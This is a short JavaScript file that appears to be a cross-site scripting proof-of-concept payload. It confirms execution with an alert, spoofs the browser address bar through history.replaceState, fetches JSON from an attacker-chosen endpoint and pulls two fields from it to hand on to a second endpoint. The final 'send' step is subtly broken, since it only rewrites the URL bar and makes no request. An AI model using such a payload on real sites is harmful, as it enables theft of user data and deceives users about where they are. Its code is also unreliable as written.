// Get values of Endpoint A, X, Y, and Endpoint B from the URL query parameters
alert("XSS Confirmed at " + window.origin);
const endpointA = new URL(window.location.href).searchParams.get("A");
const x = new URL(window.location.href).searchParams.get("X");
const y = new URL(window.location.href).searchParams.get("Y");
const endpointB = new URL(window.location.href).searchParams.get("B");

// Change the location shown in the URL bar
window.history.replaceState({}, "", endpointA);

// Make a request to Endpoint A
fetch(endpointA)
  .then(response => response.json())
  .then(data => {
    // Fetch two parameters from the JSON response body
    const i = data[x];
    const n = data[y];

    // Append I and N as query params in a request to Endpoint B
    const url = new URL(endpointB);
    url.searchParams.set("I", i);
    url.searchParams.set("N", n);

    // Send the request to Endpoint B
    window.history.replaceState({}, "", url);
  });
